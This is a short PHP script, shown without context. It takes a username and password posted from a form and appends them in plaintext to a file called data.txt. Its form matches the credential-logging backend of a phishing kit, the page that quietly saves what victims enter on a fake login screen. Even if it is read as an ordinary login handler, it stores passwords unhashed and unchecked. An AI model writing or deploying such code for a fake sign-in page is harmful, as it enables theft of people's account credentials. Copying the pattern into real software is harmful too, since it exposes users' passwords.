<?php
$user=$_POST['txtuser'];
$pass=$_POST['txtpass'];
$fp=fopen('data.txt','a+');
fwrite($fp,$user.' - '.$pass);
fclose($fp); 
?>